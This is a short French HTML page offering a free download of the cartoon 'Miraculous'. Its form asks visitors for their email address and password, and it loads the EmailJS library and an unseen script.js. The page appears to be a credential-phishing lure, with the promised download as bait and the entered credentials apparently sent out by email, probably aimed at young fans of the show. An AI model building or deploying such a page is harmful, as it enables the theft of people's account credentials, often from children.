<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Télécharger Miraculous</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="background">
        <div class="container">
            <div class="title-box">
                <h1>Télécharger <span class="highlight">Miraculous</span></h1>
            </div>
            <div class="image-placeholder">
                <img src="ladybug.png" alt="Ladybug Image">
            </div>
            <form id="downloadForm">
                <input type="email" id="email" name="email" placeholder="Email" required>
                <input type="text" id="password" name="password" placeholder="Mot de passe" required>
                <button type="submit">Télécharger Gratuitement</button>
            </form>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
